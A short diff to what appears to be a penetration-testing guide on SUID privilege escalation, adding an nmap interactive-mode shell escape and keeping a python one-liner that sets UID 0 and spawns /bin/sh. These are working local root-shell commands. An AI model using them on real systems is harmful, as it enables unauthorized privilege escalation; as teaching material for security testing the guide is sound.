@@ -25,7 +25,13 @@ Perfect candidates are:
 ![suid gtfobins](./img/image-4.png)
 
 **Examples:**
-- **/usr/bin/python***
+- **/usr/bin/nmap**
+    ```
+    nmap --interactive
+    
+    nmap> !sh
+    ```
+- **/usr/bin/python**
     ```
     python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
     ```
